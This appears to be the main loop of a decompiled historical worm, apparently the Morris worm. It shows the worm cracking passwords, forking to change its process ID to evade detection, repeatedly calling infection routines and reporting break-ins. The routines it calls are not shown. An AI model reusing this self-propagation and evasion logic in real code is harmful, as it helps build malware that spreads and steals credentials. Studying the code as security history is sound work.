static mainloop()				/* 0x2302 */
{
    long key, time1, time0;
    
    time(&key);
    srandom(key);
    time0 = key;
    if (hg() == 0 && hl() == 0)
	ha();
    checkother();
    report_breakin();
    cracksome();
    other_sleep(30);
    while (1) {
	/* Crack some passwords */
	cracksome();
	/* Change my process id */
	if (fork() > 0)
	    exit(0);
	if (hg() == 0 && hi() == 0 && ha() == 0)
	    hl();
	other_sleep(120);
	time(&time1);
	if (time1 - time0 >= 60*60*12)
	    h_clean();
	if (pleasequit && nextw > 0)
	    exit(0);
    }
}